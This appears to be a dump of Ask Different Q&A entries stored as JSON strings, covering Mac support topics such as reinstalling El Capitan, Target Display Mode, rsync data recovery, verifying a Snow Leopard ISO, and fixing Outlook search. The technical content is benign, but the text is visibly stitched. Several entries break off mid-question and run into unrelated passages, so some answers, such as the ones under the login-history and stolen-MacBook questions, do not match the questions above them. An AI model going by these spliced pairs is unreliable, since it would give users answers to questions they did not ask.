a copy of the Mojave or High Sierra installers via the download links.\nIt will take a little bit of work, but you can get it done!\n\nA: Borrow a friend's computer which can download Mojave. Download it, but don't install. Then you can move the installer file to a thumb drive or other media, and thence to your machine.\n", "Q: View login history in Macbook app store app When I opened the app store app on Macbook Pro, it asked me to login in a pop-up box.

I would like to get all apps on one account so I don’t have to input passwords for several different Apple ID’s.\n\nA: No, in general, that would abuse the privacy of the other account. \nThe only exception is if all Apple ID were in family sharing and opted in to share app information. Then you can browse the other purchases from your account. \nThere also isn't a way on device to see which account purchased which apps if you happen to sequence several accounts to purchase on one device. \n", "Q: Single Keyboard Maestro keyboard macro, but different action depending on active application? In Keyboard Maestro I want to create a list of keyboard shortcuts, and then under each keyboard shortcut an action to be performed on a per-app basis if that application is active.\nFor example, when I press ⌘Left, I always want to switch to the tab to the left.\nI want this action to apply in Chrome, Safari, Xcode, and other apps.

The root directory of most Mac systems has a hidden directory called .fseventsd. This holds a log file of file system events.  The log file is commonly used in digital forensics investigations, because it holds a list of files touched within particular times.\nI'd like to know why the Mac is writing this information to the disk and how often the log is cleaned. \n\n\n*\n\n*Why is this log being created?\n\n\nReally, it makes no sense. It's possible for programs to register to get events having to do with changes in the file system. So why write them to a persistent log in the file system?\n\n\n*How often is it cleaned?\n\n\nOne of my Macs has been running since Dec 2018. A month ago it had events going all the way back to the day I bought it; now it has events going back to March 2 at 14:47 (I'm typing this on March 16.)\nI've looked online and can find information about how to decode the file format, but I really can't find anything about why it is there. \nFor background on fsevents, see:\n\n\n*\n\n*http://nicoleibrahim.com/apple-fsevents-forensics/, Article and Research by Nicole Ibrahim\n\n*https://github.com/dlcowen/FSEventsParser, Free parser\n\n*https://www.crowdstrike.com/blog/using-os-x-fsevents-discover-deleted-malicious-artifact/, Crowd Strike on how to use it in digital forensics.\n\n\nA: The log is created so that applications that are interested in detecting and responding to file level changes can do so in a reasonable matter. This article has a more in depth explanation, but at a high level, the .fseventsd log allows an application to quickly determine what has changed in a directory since the last time it ran. Otherwise an application would need to be running 100% of the uptime of the system to make sure it was always processing each event in real time.\n", "Q: Connect 2 earbuds iPhone 6s Need ability for 2 people to listen to my iPhone 6S at the same time.

In the past I was able to cast to Chromecast from my MacBook. But there's a lot of indications that this service may have been discontinued. For example, the Cast extension on Chrome has been discontinued. Is there still a way to cast to Chromecast from your MacBook? I find it perplexing that they discontinued this service since it was such a useful feature.\n\nA: Fortunately, I am now able to cast on my computer. The trick is to set up Chromecast on your phone/tablet, as currently it cannot be setup from a computer. These days, Google Chrome has a cast option built-in, which can be accessed if you click the button with three vertical dots on the top right of Chrome. So there is no longer any need to download the Cast extension, as Chrome ships with it.\n", "Q: RAM recommendation for hosting 8gb Linux Mint under Virtualbox? I need to run the latest version of Linux Mint (19.1) under VirtualBox for software testing and debugging.

The officially supported ram configurations are: 8gb, 16gb, and 32gb but a local former Apple dealer said 24gb MIGHT work as well. \n\nA: Below are some points about purchasing memory for a Mac.\n\n\n*\n\n*Buy the memory in pairs of equal size. If possible the pair should be sold in the same package. This avoids possible timing issues.\n\n*The price for the same memory usually increases with time. So waiting to upgrade usually is not economical. \n\n*The number of banks usually is limited. So if you upgrade now and again later, you will may have to remove memory installed during the first upgrade. This ends up being more expansive than if you had chosen a larger upgrade in the first place.\n\n*Buy memory that explicitly is for your Mac. The same memory for a PC often will not work in Macs. \n\n*The two banks of memory do not have to be the same size, but if you are purchasing memory, you will get better performance if the banks are the same size.\nI believe posting recommendations is discouraged here at Ask Different. However, I will say that memory requirements for successfully hosting a virtual machine is larger than any other application I have installed.\n", "Q: Which MacBooks can run 10.11.3 OSX MacBook Pro mid2012 was stolen.

This means that you can restore the backup to a new MacBook Pro that only supports Mojave for example. All your personal files, applications and preferences will be restored. However system specific items such as for example hardware drivers will not be restored.\nYou can find instructions on how to restore excluding the OS here:\nhttps://support.apple.com/en-us/HT203981\nIf you do intend to restore with the OS, please be advised that even though the El Capitan system requirements, that you have been provided a link for, specified “or newer” when talking about the MacBook Pro - that is strictly not true.

I have a MacBook Pro 2017 running macOS 10.14.3.\nIn my home I have a WiFi router which multiple devices connect to, including my MacBook. Recently for some reason my MacBook has been having trouble connect to it. When I manually select the network in the WiFi menu, it tries to connect to it for a few seconds and then fails with the helpful error message \"Unable to connect, try moving closer\" (or something like that) with no additional error information about what exactly the issue is.\nAfter numerous attempts, it eventually manages to connect to the network but running ping 192.168.1.1 (my router's IP) or ping google.com, most of the packets time out or take 1s to reply.\nMoving closer to the router does not fix the problem.\nOther devices (e.g. my iPhone) can connect and work fine.\nI can connect to my iPhone via hotspot, but the network performance is more or less the same. pings are terrible, even though browsing the web using mobile data on my iPhone works well.\nI have Windows 10 installed via Boot Camp on my machine too. If I reboot into Windows, it connects fine and ping works great. So this leads me to believe that there is something wrong with macOS that is causing this issue.\nI understand this is probably one of those questions that can't easily be solved since it could be any number of things that is causing the problem, but can anyone suggest things I can try to diagnose the issue? Can I \"reset\" the network stack somehow?\n\nA: I figured it out. It's the weirdest thing.\nMy WiFi doesn't work when I have a certain external HDD plugged in via USB (Seagate Backup Plus).\nI have no idea why it would be interfering with the WiFi signal. I don't have this problem with other external HDDs.\nEdit\nUpon further investigation it appears to be an issue specifically with the USB C to A adapter that I am using. This question is my exact issue.\nThe WiFi interference is strongest when I plug in my Seagate Backup Plus 4TB external HDD, a little less when I plug in my Seagate Expansion 1TB, and little or no interference when I plug in my mouse.\nIt probably has to do with the amount of power these devices require, and also my USB adapter is very cheap so it probably has bad shielding.\nI also have an official Apple USB adapter that does not have this problem, but I don't know if it's because this adapter has a cable so it is slightly separated from my laptop, or maybe it's just better quality with proper shielding.\n", "Q: Unable to delete folder with phantom sub-folders / files I had a postgres database folder which I had sent to the trash.

I store my iTunes library on a Synology NAS and access it from an SMB share. The library is larger the SSD in my Macbook, so I cannot store it locally.  \nDoes Time Machine back a library that is on a network drive? \nI entered Time Machine today and tried to navigate to the iTunes library share but it isn't there. That leads me to believe that it isn't being backed up. \nIf it isn't being backed up, is there a way to get Time Machine to back it up? If not, is there an alternative? If I remember correctly, Backblaze will not back up network drives. I'm not aware of another backup service for Macs, but I am open to suggestions. \nIt's taken me countless hours to organize my library, fixing song/album info, download album art, etc, in addition to the cost of buying tons of music from various sources. \n\nA: No, Time Machine does not backup network drives.\nYou would need to setup a system to copy/sync the network drive contents to your own computer in order to have it backed up by Time Machine. This means that you would need space on your own computer to actually store the whole contents of the network drive. You can use the program \"SyncTwoFolders\" to achieve this.\nThe most common method though of backinging up Synology NAS drives is simply to use the backup solutions available for the Synology NAS itself. Depending on the model, you'll often have Synology HyperBackup available, and you'll be able to backup to local externally attached hard drives, to S3 in the cloud, or a number of other backup destinations.\n", "Q: MacBook Pro Battery I have a MacBook Pro mid 2012 unibody and it does not charge the battery.\nThis Mac was used by one of my friends for two years with the batter still working and kept for one year without using it.\nThe battery is not detected.\nWhat do I need to do disclosing buying a new battery.\n\nA: Probably the battery has deep discharged and it needs some time before it starts charging properly and even before it's shown as present... \nHere are most of the answers about batteries, from Apple knowledge base:\nhttp://support.apple.com/kb/HT1119\n", "Q: Can I get 2560x1440 resolution on external monitor? I have a mid-2015 MacBook Pro running High Sierra. I normally use it as a desktop computer in clamshell mode with an external monitor.\nI just replaced my 24-inch external monitor with a 32-inch monitor. The new monitor is an Acer EB321HQU-B, which is supposed to support up to 2560x1440 resolution. \nAccording to the technical specifications my Mac is supposed to support\n\nfull native resolution on the built-in display and up to 3840 by 2160 pixels on up to two external displays, both at millions of colors.\n\nand\n\nSupport for 3840-by-2160 resolution at 30Hz\n\nI have the new monitor connected via a Mini DisplayPort to HDMI adapter.\nBut the best I can get is 1920x1080, which is the same as my old monitor. In Display preferences, the only options I see in Scaled are 1600x900, 1080p, 1080i, and 720p, whether I select 60Hz or 30Hz. So I can't show any more on the screen, it's just all scaled up 33%.\nIs there some way I can take advantage of the new monitor?\n\nA: The problem is the cable you’re using to connect the monitor to the computer.\nThe easiest way to ensure that you have the full resolution is to use a standard mini-DisplayPort to DisplayPort cable and you should be able to use the full resolution without problems.\nYou can also use a mini-DisplayPort to DVI cable, but these are usually harder to come by in a standard home electronics store.\nLast but not least, it might be possible to get the full resolution by using a better HDMI cable. You'll need one that supports HDMI 1.3 or 1.4 to support the 2560x1440 resolution.\n\nA: Why did you not use a Mini DisplayPort to DVI adapter? For example, this item.\nA mini-DisplayPort actually has the DVI signals. Only the jack is smaller. The converter does not need to convert the signals. There are just wires connected between the smaller  mini-DisplayPort pins and the larger DVI jack pins.\n", "Q: On dual-boot macOS/Ubuntu Mojave install failed with \"This disk cannot be used to startup your computer.\" My box is mid 2012 MacBook Pro, 1 TB HD, Sierra 10.12.6.

I've charged it for a few hours in case it was a battery issue, but it's still not working. \n\nA: Make sure the power is on to your trackpad. You should have a BlueTooth icon on your menu bar.

Sometimes when I enable Target Display Mode, the iMac screen stays black, even if my Macbook Pro's display suggests that another monitor has been plugged in (apps move away from the screen).\nHow can I fix this?\n\nA: On closer inspection, it looks like the display is not actually uniformly black. This led me to conclude that perhaps the backlight was just not turned on properly, and led me to discover the following workaround:\n\n\n*\n\n*Log into the iMac\n\n*Change the brightness to a different level (e.g. up or down by one). The level seems to need to be different from the one previously used.\n\n*Enable Target Display Mode again, by pressing Command+F2\n\nA: On the Macbook, change the rotation on the iMac display to 90°, then revert it back (or let it revert back after the timeout) to Standard. That seems to snap it out of its zero-brightness funk more or less every time much more frequently than other display changes.[1]\n(Of course, you can't do this in clamshell mode, you need some functioning display to use System Preferences→Displays on.)\n[1]: (I've seen it fail once or twice, but it is the most reliable workaround I've found yet.)\nUpdate 2021-07-12: Apple discontinued support for Target Display Mode in all operating systems since High Sierra, and so it was likely that this was officially unsupported / broken even at the time the question was written. I also definitely used TDM on Mojave for a while, and I think maybe even on a Catalina beta for a while; it still almost worked but it was incredibly janky.  So if you've upgraded your iMac … some of this fiddling might help you, but it probably just won't work.\n\nA: I posted this on another question, not sure how to link it so adding again here..\nI use 2009 iMac as an external monitor to my 2015 MBP.. all running latest supported OS as of today.\nCOMMAND-F2 on the iMac keyboard will toggle between the running iMac local display, and the Target Display Mode (TDM) when connected to my laptop via DisplayPort. TDM always starts out at 100% brightness when you switch to it.\nCOMMAND-F1 will adjust brightness lower until it goes completely dark. If that happens you need to switch back to iMac local display then return again to TDM which resets to 100%\nNow the important part: COMMAND-F1 sometimes doesn't respond to lower the brightness. I found this seems to happen if local iMac screen is locked.. if I switch back to local iMac display and log in to the account to unlock it, then when I switch back to TDM, the brightness control will now respond.\n\nA: I have found some luck the using the old trick of just mashing the buttons:\n\n*\n\n*Use Command F2 as instructed\n\n*Once the failed result of the black screen of the TDM (for me iMac 2012) shows hold Command and press  F2  5 times (this should result in theory to issueing a new command for TDM On - Off - On - Off - On)\n\n*If this fails - try a different number of  F2  smashes for different results\n\nThis has proved successful for me, not sure how reliable it is though.\nI am using a Macbook Pro 16 inch 2019 running Ventura, and a Late 2012 iMac running Catalina, has anyone had better luck reverting the TDM (iMac) to High Sierra (as apple advise)? I feel like Catalina on the iMac might be causing problems but I'm hesitant to restore it to High Sierra.\n\nA: Resolved. Had to uncheck 'Automatically adjust brightness' on the iMac's display control. \n\nA: So for those of you who still have this problem and nothing above helps.\nIt only worked for me only after logging the user out on the iMac.\n\n*\n\n*You log off\n\n*Press CMD + F2 (sometimes you need try it two times)\n\nBut logging off the user every time I want to use the imac in a target display mode is quite annoying. I found another option which works for me:\n\n*\n\n*Lock iMac (CMD + CTRL + Q)\n\n*On the login screen of the imac click: \"Switch users\"\n\n*The list of users should appear on the screen of the iMac\n\n*Now press CMD + F2\n\n*It usually does not work from the first try. So if the screen of the iMac is just black, press CMD + F2 to exit \"target screen\". And then press CMD + F2 once again. Always works for me from the second try and does not require a user to be logged off from the imac.\n\nHope this helps\n", "Q: Permissions for file transfer over target disk mode I have a 2015 iMac that no longer boots.

I know the various passwords, but I'm not clear on whether the old iMac, now no longer able to access the network, will know them.\nMy overall question is how to recover the data from the old iMac; if there's a simpler way than connecting via Target Disk mode, entering the appropriate permissions, and copying files to the new machine, that would be welcome too.\n\nA: I did an almost identical recovery a couple days ago. Heres my answer:\nDON'T USE MACOS BUILT IN TRANSFER METHODS\nI have found them extremely unreliable, difficult to debug, and unable to resume on failure.\nInstead, use rsync!\nConnect via Target Disk Mode. Make sure to ignore permissions on the drive.\nThe following command will recovery everything and preserve metadata including dates, etc.  It works extremely well, is able to resume on failure, and shows progress.\n/**\n  *\n  *  /path/to/source - Path to the disk you want to recovery (or a folder on it if you only want specific things)\n  *  /path/to/destination - Path to disk you want the items to be copied to\n  *\n  */\n\n rsync -avP /path/to/source /path/to/destination\n\nIt will take a while to count files but you will see it counting.\nTo continue - https://unix.stackexchange.com/questions/67539/how-to-rsync-only-new-files\n", "Q: 2nd hand iMac with no OS I have just got a second hand iMac (Core 2 Duo 2.4 20\" Mid 2007) Which has been fully wiped. I have connected it to wifi and am trying to install OS X by using the reinstall option but when I log in to the App Store it just says item temporarily unavailable. It seems to have decided that El Capitan 10.11 is what its looking for but cannot access it to download it.\nAny suggestions so that I can get an OS on to this computer and actually use it?!\nThanks.\n\nA: I have a 2007 iMac. A while back, I replaced the internal drive with a 1 TB hard disk. The Mac still has a working optical drive. Currently, the mac has 64 bit Windows 10 Pro, Ubuntu Linux, Yosemite and El Capitan installed. I am fortunate, in that I have a 2011 iMac running High Sierra and a Snow Leopard DVD.\nOne path to reinstall would be to install Snow Leopard from a DVD. Apple still sells the DVD for 20 USD. If necessary, you should upgrade to OS X 10.6.8. One way to accomplish this would be to download the Mac OS X 10.6.8 Update Combo v1.1. Finally, the current instructions for upgrading to El Capitan can be found here. This site has a this link to the Apps Store where El Capitan can be downloaded.\nAnother path would be find someone who has purchased (for free) El Capitan. If this person has access to a Mac running High Sierra or earlier, then they can download El Capitan to this Mac. El Capitan can be transferred to a bootable USB flash drive installer. The instruction are given here. Basically, the command below needs to be executed on a flash drive formatted Mac OS Extended (Journaled) with the label (Name) MyVolume.\nsudo /Applications/Install\\ OS\\ X\\ El\\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume --applicationpath /Applications/Install\\ OS\\ X\\ El\\ Capitan.app\n\n\nNote: I also have a 2013 iMac running Mojave. When accessing the Apps Store, the Yosemite and El Capitan operating systems do not appear. So accessing previous purchases now depend on the version of macOS your are using.\n\nUpdate: How to Get and Verify a Snow Leopard ISO File from the Internet\nMac User posted in an answer which states a Snow Leopard ISO file can be download from this website. This site shows an image of a DVD. I happen to have that very DVD. This is OS X version 10.6. So I decided to conduct some research using an iMac (21.5-inch, Mid 2011) running macOS High Sierra Version 10.13.6. Here is the work and results.\nFirst, I downloaded the ISO file from the website. This was named snow leopard install.iso.\nNext, I used the Disk Utility to create a DVD/CD master image of the Snow Leopard DVD named SnowLeopardDVD.cdr. I used the command shasum -a 256 snow\\ leopard\\ install.iso to get a SHA256 checksum, as shown below.\ncbeeb2378c40b20a9b06236f567de593e9030a0a865515b50cf6d35833e25cd5  snow leopard install.iso\n\nThe command ls -l SnowLeopardDVD.cdr snow\\ leopard\\ install.iso produced the following output.\n-rw-r--r--@ 1 davidanderson  staff  7771496448 Mar 19 01:11 SnowLeopardDVD.cdr\n-rw-r--r--@ 1 davidanderson  staff  7771521024 Mar 18 18:34 snow leopard install.iso\n\nThis shows the download to be 24576 bytes larger. I used the hexdump -C -s 7771496448 snow\\ leopard\\ install.iso to display these extra bytes. The output shown below. This output shows all these extra bytes are zero.\n1cf37a000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n1cf380000\n\nNext, I used the Finder application to mount both files. The snow leopard install.iso file mounted as disk1 and the SnowLeopardDVD.cdr file mounted as disk3. Neither of the next two commands produced any output. This means the disk1 and disk3 are identical to the files that were mounted.\n\nNote: In some instances, I needed to unmount one or more volumes before using certain commands.\n\ncmp /dev/disk1 snow\\ leopard\\ install.iso\ncmp /dev/disk3 SnowLeopardDVD.cdr\n\nThe output from diskutil list disk1 and diskutil list disk3 is shown below. The output shows the partitions are the same type and size.\n/dev/disk1 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     Apple_partition_scheme                        +7.8 GB     disk1\n   1:        Apple_partition_map                         30.7 KB    disk1s1\n   2:         Apple_Driver_ATAPI                         1.0 GB     disk1s2\n   3:                  Apple_HFS Mac OS X Install DVD    6.7 GB     disk1s3\n\n/dev/disk3 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     Apple_partition_scheme                        +7.8 GB     disk3\n   1:        Apple_partition_map                         30.7 KB    disk3s1\n   2:         Apple_Driver_ATAPI                         1.0 GB     disk3s2\n   3:                  Apple_HFS Mac OS X Install DVD    6.7 GB     disk3s3\n\nNone of the commands shown below produced any output. This means the partitions are identical. \ncmp /dev/disk1s1 /dev/disk3s1\ncmp /dev/disk1s2 /dev/disk3s2\ncmp /dev/disk1s3 /dev/disk3s3\n\nNext, I execute the command cmp -l SnowLeopardDVD.cdr snow\\ leopard\\ install.iso. Only the first and last 2 lines of the output is shown below.\n1034487809 343   0\n1034489856  65   0\ncmp: EOF on SnowLeopardDVD.cdr\n\nSince I now know both files are using the Apple_partition_scheme, I can post the output from the commands pdisk -lr /dev/disk1 and pdisk -lr /dev/disk3, as shown below. Again the partitions appear to be the same type and size.\nPartition map (with 2048 byte blocks) on '/dev/disk1'\n #:                type name       length   base    ( size )\n 1: Apple_partition_map Apple          15 @ 1      \n 2:  Apple_Driver_ATAPI Macintosh  505105 @ 16      (986.5M)\n 3:           Apple_HFS Mac_OS_X  3289554 @ 505122  (  6.3G)\n 4:          Apple_Free                 3 @ 3794676\n\nDevice block size=2048, Number of Blocks=3794679 (7.2G)\nDeviceType=0x0, DeviceId=0x0\n\nPartition map (with 2048 byte blocks) on '/dev/disk3'\n #:                type name       length   base    ( size )\n 1: Apple_partition_map Apple          15 @ 1      \n 2:  Apple_Driver_ATAPI Macintosh  505105 @ 16      (986.5M)\n 3:           Apple_HFS Mac_OS_X  3289554 @ 505122  (  6.3G)\n 4:          Apple_Free                 3 @ 3794676\n\nDevice block size=2048, Number of Blocks=3794679 (7.2G)\nDeviceType=0x0, DeviceId=0x0\n\nSince I now know the block size is 2048 bytes, I can convert the byte counts given as output from the last cmp command to blocks, as shown below.\n1034487809 bytes = 505,121 blocks * 2048 bytes/block + 1 byte\n1034489856 bytes = 505,122 blocks * 2048 bytes/block + 0 bytes\n\nThe above conversion shows all the differences occur in the one unused 2048 byte block between the Apple_Driver_ATAPI and Apple_HFS partitions.\nThe next commands extend the SnowLeopardDVD.cdr file by 24576 bytes of zeros. The following command zeros the 2048 byte block between the Apple_Driver_ATAPI and Apple_HFS partitions in then SnowLeopardDVD.cdr file. \ndd if=/dev/zero bs=1 count=24576 seek=7771496448 of=SnowLeopardDVD.cdr\ndd if=/dev/zero bs=2048 count=1 seek=505121 conv=notrunc of=SnowLeopardDVD.cdr\n\nThe command given below produces no output, thus confirming the SnowLeopardDVD.cdr and snow leopard install.iso files are now the same.\ncmp SnowLeopardDVD.cdr snow\\ leopard\\ install.iso\n\nThe result of this research is outlined below.\n\n\n*\n\n*The ISO I download is authentic. The differences that occur outside the partitions are not used and are zero in the ISO file.\n\n*If another website promotes the download of an ISO file of this same DVD, you can use the information in this answer to verify if the download is authentic. This is why I included the SHA256 checksum of the ISO file I downloaded.\n\nA: Due to your older model Mac, you can not use the now common method of updating/downloading OSX from the internet, a feature built into OSX Utilities.\nInterestingly, if you have 'purchased' an old OS via the App Store before, they are available to you for download (at least down to El Capitan), but if you had not purchased them before, they are no longer available.\nYou will need the original disk that came with your system.

The only way I can think of is to export the folder using the \"Export Mailbox\" menu item, and then write a script (shell script for example) which will parse the email file and split it when it finds a new mail header.  It seems a new message starts with every line which starts with \"From \" (including the space).   Is this the best way?\n\nA: Procmail is a possibility, but a) it's no longer maintained, and b) it may or may not run under macos. There are some other programs listed on procmail's Wikipedia page that may be useful. \nBut, just as a guess, I think you might have to \"roll your own\".

I had deliberately not updated the iOS as an app I used was not being updated and worked well on the old iOS. \nNow I need to restore the back up to another iPad. I thought this would be easy but it seems not. \nFor the app I want to use to work I need iOS 8 or earlier. Specifically I had 8.4.1 but it was the upgrade to 9 that killed the app. \nI am unsure of a few things and would value some advice:\nDoes the backup include the iOS? Ie if i buy an old iPad that can run ios8 will the backup automatically include the iOS? Can I just restore and get everything back. \nOr will the backup just add apps and data to the existing iOS? In which case will it refuse to do it if the existing iOS is less than the 8.4.1 with which the back up was saved?\nIf this is the case I need to put iOS higher than 8.4.1 yet lower than 9 on an iPad and then restore. How can I do that?\nThanks for any help. I have a lot of work in this app so any suggestions are welcome. \nJ\n\nA: No, the backup does not include the operating system. However iOS can be easily downloaded from the internet, so that is not a limiting factor in itself.\nThe main problem is that you cannot downgrade an iPad to iOS 8 at all. The original iPad only supports up to iOS 5, and the next-oldest iPad - the iPad 2 - supports iOS 9. As it is only possible to downgrade to the iOS versions that Apple actively is signing, which only includes the latest versions available for the hardware, you're out of luck.\nYour only possibility is to buy a used iPad that has iOS 8 on it.\nI would recommend instead getting an iPad with a newer iOS, as there's serious security implications to running older iOS versions - and then search for a replacement app, or ask the original developers if you can convince them to update the app for newer iOS versions.\n", "Q: iTunes automatically pauses when VLC plays a file I noticed that if I have some background music on iTunes and I start playing a VLC video, iTunes automatically stops the music.\nAlthough this can be a very useful thing, I would prefer to have control of it, for example in my case I would like to keep listening the background music when I watch a non-music video.\nIs there an option in iTunes to disable pausing? I tried to look at the iTunes options but I didn't find any, perhaps it is a setting which cannot be changed?\n\nA: After a long search, I have realized that the setting to pause iTunes is not in iTunes, but it is on VLC. So it is not iTunes pausing the music because it detects another media player, but it is VLC which is pausing iTunes when playing files.\nTo disable this, just open the preferences of VLC and click on the following items:\nShow All -> Interface -> Main interfaces -> macosx\nAfter that, on the Control external music players field, you can select among Do nothing, Pause iTunes and Spotify and Pause and resume iTunes and Spotify. I selected the first option :-)\nI share this knowledge here in Q&A style in case someone else was struggling with this.\n", "Q: No install location available in Mac Internet Recovery I tried to start my Mac & a folder with a question mark appeared.\nI researched on Google and discovered it was a problem with the Boot partition.

Therefore, I hypothesize that if it used the same graphics configuration when it's plugged to the power, then the overheating would be reduced.\nIs there a way to make the MPB use the same graphics configuration for external displays also when it is connected to the power?\n\nA: The 2018 15\" MacBook Pros all have dual-GPUs. The AMD GPU is required to be active when an external screen is connected. There is no way to use the internal (Intel) GPU for external screens. \nFan noise is one of the main nuisances of the recent MacBook Pros in my opinion. When I get too frustrated, I sometimes use Turbo Boost Switcher, which helps a bit. Volta is a similar App, but does not seem to work with 2018 MacBooks. Both Apps deactivate the CPU's Turbo Boost mode, which means less speed, but also less power consumption and less noise.\nUpdate: I forgot to mention AppTamer; another tool which often saves me some noise.\n\nA: \nIs there a way to make the MPB use the same graphics configuration for\n  external displays also when it is connected to the power? ...I noticed that if I connect my MBP to an external display when it runs with battery, it does not get (so) hot.\n\nNo.  Your MacBook's processor uses Intel SpeedStep technology (including the current 8th gen models) that reduces power when connected to battery to slow things down to increase battery life.  This is why it's less hot.\nWhen you connect an external monitor it will use the discrete GPU, so there's no getting around that; this can't be reconfigured.\n(IMO), Apple has reached the threshold of where it can take function following form.  Because of this, I have modified my behavior and expectations of what their \"mobile workstations\" (aka MacBook Pros) are capable of delivering.  I personally use an Air, old Pro, or a plain MacBook and off load my heavy lifting to the cloud.\n\nA: The fan system is the thing that goes in a curve on the picture.\n\n", "Q: How to write a formula with a reference that adapts to new columns When writing a reference in a formula like:\nHLOOKUP(Table1::B$2$;Table2::G$3:K$82;46)\n\nhave the area referenced adapt to new columns added to Table2.\nE.g. Table2 has columns from A to K, and every column contains the same formula. When I add extend the table with new columns, until AA the reference should target Table2::G$3:AA$82.\nI am writing a complex solution involving COLUMNS() and ADDRESS(), but I'm looking for the general accepted way of doing this.\n\nA: Sadly, there simply is no feature in Numbers resembling open-ended cell-range references.\nThe only manageable workaround I observed actually working as intended involved either using entire rows, or marking as headers all of the columns/rows to be ignored.\n\"Whole rows\" tack, example procedure:\n\n\n*\n\n*Normalize and rearrange your data to inhabit the entire set of rows in question, rather than starting in column G.\n\n*in your formulas' references to those areas, don't use any column letters. For example, \nrather than COUNTA(G3:AA82,\">50\") use instead COUNTA(3:82,\">50\")\n\"Headers\" approach, example procedure:\n\n\n*\n\n*select Table2 column A\n\n*choose 'Add Header Column Before' from the 'Table' menu (may differ between versions?)\n\n*select cells in the new column A, from A3 down to A82\n\n*from the 'Table' menu, choose 'Merge Cells'\n\n*enter a fitting name for that group of rows into A3\n\n*use that name in any formulas needing those rows\n\n\nAll data following the header column/row is referred to by its chosen label. You'll see Numbers offering it in the auto-complete choices as you type it into formulas, and when chosen that area will be highligted.\nThey're both means to the same end, and behave similarly in practice. With both, you'll see the desired behaviour that when adding additional columns/rows, the new area will be no exception—the formulas with references to whole rows/columns or names from headers will also see any new data.\nAgain, particular to your described spreadsheet, note that since you're starting your data in column G, you may need to…\n• alter your formulas to ignore non-numbers\n• alter your formulas to ignore data that doesn't pass some other test\n• rearrange your overall layout so the data starts in column B\n", "Q: Is is possible that a software issue could be causing spotty USB-C connections on 2017 MacBook Pro? I have a 2017 MacBook Pro. It has 2 USB-C ports on the left side and I use an Aukey hub to provide more ports (4 USB, 1 HDMI, 1 USB-C) and always to connect two monitors. \nI connect one monitor through the hub with the HDMI port and another directly to the MBP with a USB-C adapter. Sometimes when I connect the hub to the Mac and the 2nd monitor to the Mac, it works as it should with no problem...but more than half the time I have to connect, disconnect, jiggle, jangle, switch ports, reconnect HDMI, etc. and hopefully they will both work. OFTEN, I can only get one monitor to fire up.\nIs there any kind of software fix or reset that might solve this issue? Any other thoughts welcome. Thanks.\n\nA: It's not a software fix, but a \"hardware\" one, that will address this issue.\nThe problem lies in the fact that the multi-function hub most likely doesn't supply an active HDMI adapter.  You can usually get around this limitation with a reboot, but that can become burdensome especially if you go from a desktop setup to a mobile setup multiple times per day.\nWhy is it a hardware issue?\nClock signals.  HDMI has one and DisplayPort (what you're converting from) doesn't.  So, when you plug in your HDMI monitor, there's no signal to sync up to.  Rebooting usually resolves this and gets everything \"synced up again.\"  A passive adapter (what is in the hub) just rearranges the signal whereas an active adapter actually recreates the signal making it much more reliable.\n", "Q: Mac Mini (2018) 10Gb Port Compatibility Is the 10Gb port on the latest Mac Mini (2018) backwards compatible with 10/100/1000Base-T devices? I ask because the Apple site reports that the upgraded 10Gb port uses NBase-T.\n\nA: Yes, it is compatible with both 1000Base-T and 100Base-T. I own the Mac Mini 2018 with 10 Gbps option and have tried both configurations in practice.\nIt doesn’t appear to be compatible with 10Base-T, but you’ll be hard pressed to find such equipment anywhere these days.\nYou can find Apple’s description of the network support at the following link:\nhttps://support.apple.com/en-us/HT208405\nIt similarly describes that 100Base-T is a supported configuration, while 10Base-T is not. Look at the included table for instructions on which cable types to use for the various supported speeds.\n\nA: Eventually, this should be compatible with 100/1000Base-T but not 10Base-T. Very little currently available hardware works with only 10Base-T. I suppose if you needed to interface with a 10Base-T device, you could just use a 10/100Base-T switch between the devices. These type of switches can be purchase for under 10 USD.\nAccording to Apple's website:\n\n", "Q: How to fix Outlook for Mac search Microsoft Outlook for Mac (version 16.21) is frequently unable to find email messages using the search feature, even in the case of emails that were sent relatively recently. I presume that the search index is broken.\nSolutions are available for PC, and I have even installed a Mac-specific tool called \"OutlookSearchRepair.app\", but this doesn't ameliorate the problem.\nAre any other solutions available?\nEdit: There is little else to say (to increase the detail of this question), save that the emails that aren't found are seemingly at random, and are not found on subsequent searches either. I have not limited my search results in any way.\n\nA: Most answer here are rather heavy-handed. The link provided by OP has apparently been updated and now suggests to reset the Spotlight index for the Outlook folder. This is a much less intrusive solution, takes about 20 minutes of rebuild time, and often works. Therefore, I would recommend to everybody to first try this method.\nQuote from the Microsoft support article [with additions by myself]:\n\n\n*\n\n*Choose Apple menu, then System Preferences, and then Spotlight.\n\n\n*Select the Privacy tab.\n\n\n*In Finder:\na. On the Go menu, select Go to Folder...\nb. Copy and paste the following location into the \"Go to the folder:\" dialog box and select Go:\n\n~/Library/Group Containers/UBF8T346G9.Office/Outlook/Outlook 15 Profiles/\n\n\n\n*Drag the \"Main Profile\" folder to the Privacy tab. Once added, remove the folder [from the Spotlight privacy tab], and Spotlight will re-index the folder.\nYou must perform this step for any additional profile folders you have.\nSee the following article from Apple to learn more: How to rebuild the Spotlight index on your Mac.\n\nAfter that macOS will rebuild the index for that folder, which will take a while (up to an hour approximately) depending on your Mac's speed and the size of your Outlook database.\nIf you suspect that there is a more severe issue with Spotlight, have a look at this answer on how to reset Spotlight completely. Again this is a rather drastic measure and may take a few hours to rebuild.\n\nA: We do two things when this happens:\n\n\n*\n\n*Validate that search works for us in the online version of outlook (we use O365 for our exchange servers so YMMV if you don't). If you can't find it on Micsosoft's servers - then the mailbox content itself has issues.\n\n*Validate that the search fails in Outlook and in spotlight and then works in both immediately (or after 5 minutes if your outlook store is large and indexing into spotlight takes more than a minute to complete).\n\n\nWhen you're sure the online search works and the local search is failing, you can be sure of one of four things:\n\n\n*\n\n*The importer that Outlook adds to the system so that spotlight knows how to index mails is broken / crashy / and needs an update. Contact Microsoft for assistance.\n\n*The mail that user has (some attachment, some calendar invite, some mail) is corrupt and if you find and delete those specific data files - the indexer will stop crashing or being corrupt or incomplete.\n\n*This just was bad luck and the index stopped one time and you won't have to run the repair tool again in a day or week or month.\n\n*Your Mac has storage or stability issues with the filesystem or spotlight in general. If this is the case, you should be able to find other things like file name search that are broken or Disk Utility telling you that the disk needs repair / erase / reinstallation.\n\n\nThere will be lots of other things to try to attack the \"bad luck\" case above like emptying the mail cache (which tell spotlight to forget all the 